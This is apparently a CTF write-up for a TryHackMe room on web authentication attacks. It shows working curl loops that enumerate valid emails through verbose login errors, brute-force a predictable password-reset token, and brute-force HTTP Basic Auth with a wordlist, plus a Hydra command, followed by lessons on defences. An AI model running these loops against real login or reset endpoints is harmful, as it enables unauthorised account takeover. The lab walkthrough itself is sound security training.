# Enumeration & Brute Force (TryHackMe)

Room: Enumeration & Brute Force — **Web Application Pentesting → Authentication** module (intermediate).
Target web app `enum.thm` with three self-contained labs. Solved headless from the Windows PC over the
THM VPN with `curl` (no AttackBox/Burp/Hydra needed) — every flag cross-verified against the live box.
Completed: 2026-11-01 | Target: <ip> | `http://enum.thm` (Apache/PHP, Host-header routed).

## Answers

| Task | Question | Answer |
|---|---|---|
| 2 | Error type that confirms valid usernames | *(find it yourself)* |
| 3 | Valid email from the list | *(find it yourself)* |
| 4 | Flag (predictable reset token) | `THM{…}` |
| 5 | Flag (HTTP Basic Auth brute force) | `THM{…}` |
| 6 | OSINT (Wayback / Google dorks) | No answer needed |

## Task 3 — Verbose-error user enumeration (`/labs/verbose_login/`)

`functions.php` leaks account existence through its error message:

```bash
# POST username/password/function=login to functions.php
invalid  -> {"status":"error","message":"Email does not exist"}
valid    -> {"status":"error","message":"Invalid password"}
```

Enumerated a gmail username list; the one account that returns **`Invalid password`** is
*(find it yourself)* (cross-checked: a near-miss like `canderson@gmail.co` and random addresses return
`Email does not exist`). The room's `script.py` automates exactly this, flagging any response that
lacks the "Email does not exist" string as valid.

```bash
curl -s -H 'Host: enum.thm' -H 'X-Requested-With: XMLHttpRequest' \
  --data 'username=*(find it yourself)*&password=password&function=login' \
  http://<ip>/labs/verbose_login/functions.php
# -> {"status":"error","message":"Invalid password"}
```

## Task 4 — Predictable reset token (`/labs/predictable_tokens/`)

Vulnerable reset logic: `$token = mt_rand(100, 200);` — a 3-digit PIN, 101 possibilities.

1. Trigger a reset — `POST email=admin@admin.com` to `forgot.php` → *"A password reset link has
   been sent."* (this writes the token into `reset_token` for the account).
2. Brute `reset_password.php?token=N` for `N` in 100–200. Invalid = *"Invalid token."* (730 b);
   the hit is larger and shows the new password:

```bash
for t in $(seq 100 200); do
  b=$(curl -s -H 'Host: enum.thm' "http://<ip>/labs/predictable_tokens/reset_password.php?token=$t")
  echo "$b" | grep -q 'Invalid token' || echo "HIT $t: $(echo "$b" | grep -oE 'new password is: [A-Za-z0-9]+')"
done
# HIT token=182 -> "Your new password is: <redacted-pw>" (email admin@admin.com)
```

3. Log in (`functions.php`, `function=login`) with `admin@admin.com` / `<redacted-pw>`, keep the session
   cookie, fetch `dashboard.php`:

```
THM{…}
```

Note: the token value (182 here) is per-reset — re-run the reset and re-brute if the box is redeployed.

## Task 5 — HTTP Basic Auth brute force (`/labs/basic_auth/`)

`WWW-Authenticate: Basic realm="Restricted Area"` — wrong creds = `401`, valid = `200`. Username
`admin`, brute the password with SecLists `500-worst-passwords.txt`:

```bash
while read -r pw; do
  code=$(curl -s -H 'Host: enum.thm' -u "admin:$pw" http://<ip>/labs/basic_auth/ -o /dev/null -w '%{http_code}')
  [ "$code" = 200 ] && { echo "HIT admin:$pw"; break; }
done < 500-worst-passwords.txt
# HIT admin:<redacted-pw>
```

`admin:<redacted-pw>` → `200`; the page (`index.php`) carries the flag:

```
THM{…}
```

Burp Intruder does this with two payload-processing rules (prefix `admin:`, base64-encode, strip `=`);
Hydra equivalent: `hydra -l admin -P 500-worst-passwords.txt -f <ip> http-get /labs/basic_auth/`.
The `curl -u` loop is the simplest headless form — Basic auth has no CSRF token or session to carry.

## Lessons

- **Enumeration precedes brute force.** A verbose login that distinguishes "doesn't exist" from
  "wrong password" halves the attacker's work — it hands over the valid username so only the password
  remains to guess. The fix is a single generic message ("invalid email or password") for both cases.
- **Reset tokens must be unpredictable and single-use with short TTL.** `mt_rand(100,200)` is 101
  guesses — brute-forced in seconds. Real systems use a long cryptographically-random token; even the
  "6-digit" variant is only safe with rate-limiting + expiry.
- **HTTP Basic Auth over HTTP is credentials in base64 (not encryption)** and has no lockout of its
  own — weak passwords fall to a wordlist instantly. Use it only over TLS, with strong creds and
  upstream rate-limiting.
- Headless note: the whole room runs over the VPN with `curl` from `C:\CTF` — Host-header routing
  (`-H 'Host: enum.thm'`) against the IP avoids touching `/etc/hosts`; session labs need a cookie jar
  (`-c`/`-b`), Basic auth needs none.
